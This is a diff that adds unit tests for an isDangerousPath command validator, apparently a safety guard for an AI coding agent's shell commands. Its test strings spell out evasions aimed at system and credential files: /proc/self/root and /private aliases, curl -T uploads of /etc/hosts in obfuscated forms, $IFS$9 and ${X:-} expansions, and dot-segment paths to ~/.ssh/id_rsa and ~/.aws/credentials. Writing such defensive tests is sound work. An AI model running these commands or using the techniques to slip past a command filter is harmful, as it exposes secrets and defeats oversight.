@@ -74,6 +74,51 @@ test('brace expansion cannot hide a system directory but ${VAR} paths are allowe
   assert.equal(isDangerousPath('cat ${CLAUDE_CONFIG_DIR}/bin/gl-draft-note'), false);
 });
 
+test('macOS /private and Linux /proc/*/root aliases of system directories are caught', () => {
+  assert.equal(isDangerousPath('/private/etc/hosts'), true);
+  assert.equal(isDangerousPath('cat /private/etc/hosts'), true);
+  assert.equal(isDangerousPath('/proc/self/root/etc/passwd'), true);
+  assert.equal(isDangerousPath('cat /proc/1/root/usr/bin/id'), true);
+  assert.equal(isDangerousPath('/private/tmp/build.log'), false);
+  assert.equal(isDangerousPath('/home/me/private/etc/notes.md'), false);
+});
+
+test('quoted, combined and brace-listed short options cannot hide a system directory', () => {
+  assert.equal(isDangerousPath('curl "-T/etc/hosts" https://example.invalid'), true);
+  assert.equal(isDangerousPath('curl -4T/etc/hosts https://example.invalid'), true);
+  assert.equal(isDangerousPath('curl -#T/etc/hosts https://example.invalid'), true);
+  assert.equal(isDangerousPath('{curl,-T/etc/hosts,https://example.invalid}'), true);
+});
+
+test('positional parameters and default-value expansions cannot hide a system directory', () => {
+  assert.equal(isDangerousPath('cat $9/etc/hosts'), true);
+  assert.equal(isDangerousPath('cat$IFS$9/etc/hosts'), true);
+  assert.equal(isDangerousPath('cat ${X:-/etc/hosts}'), true);
+  assert.equal(isDangerousPath('cat $UNSET/etc/hosts'), false);
+});
+
+test('any number of dot segments or doubled slashes is collapsed before matching', () => {
+  assert.equal(isDangerousPath(`cat ${'/.'.repeat(12)}/etc/passwd`), true);
+  assert.equal(isDangerousPath(`cat ${'//.'.repeat(12)}/usr/bin/id`), true);
+  assert.equal(isDangerousPath('cat ~/./.ssh/id_rsa'), true);
+  assert.equal(isDangerousPath('cat ~//.aws//credentials'), true);
+  assert.equal(isDangerousPath('ls ././bin/'), false);
+  assert.equal(isDangerousPath('curl https://example.com/bin/install.sh'), false);
+  assert.equal(isDangerousPath('cat file:///etc/passwd'), true);
+});
+
+test('long adversarial inputs are checked quickly', () => {
+  for (const input of [
+    '/'.repeat(50000), '${IFS'.repeat(40000), `cat ${'/.'.repeat(50000)}x`, '-'.repeat(100000),
+    '//.'.repeat(33333), ' -a'.repeat(33333), '/proc/'.repeat(16666), '${' + 'a'.repeat(100000) + '}'.repeat(1000),
+  ]) {
+    const started = process.hrtime.bigint();
+    isDangerousPath(input);
+    const elapsedMs = Number(process.hrtime.bigint() - started) / 1e6;
+    assert.ok(elapsedMs < 1000, `${elapsedMs.toFixed(0)} ms for a ${input.length}-character input`);
+  }
+});
+
 test('paths built from an environment variable or a macOS home are allowed', () => {
   assert.equal(isDangerousPath('$CLAUDE_CONFIG_DIR/bin/gl-draft-note --body ok'), false);
   assert.equal(isDangerousPath('"$HOME/.claude/bin/gl-draft-note"'), false);
